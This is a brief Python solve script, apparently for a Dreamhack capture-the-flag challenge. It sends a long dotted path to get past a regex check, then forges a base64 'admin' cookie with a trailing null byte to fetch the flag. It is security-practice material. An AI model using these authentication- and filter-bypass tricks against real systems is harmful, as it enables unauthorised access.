import requests
import base64

url = 'http://host3.dreamhack.games:23449/'
s = requests.Session()

# regex bypass
for _ in range(2):
    res = s.post(f'{url}/test', data={
        'method': 'GET',
        'path': '.' * 100 + 'a'
    }, cookies={
        'auth': base64.b64encode(b'guest').decode()
    })

# auth bypass
res = s.post(f'{url}/test', data={
    'method': 'GET',
    'path': '/flag'
}, cookies={
    'auth': base64.b64encode(b'admin\x00').decode()
})

flag = res.json()['message']
print("Flag:", flag)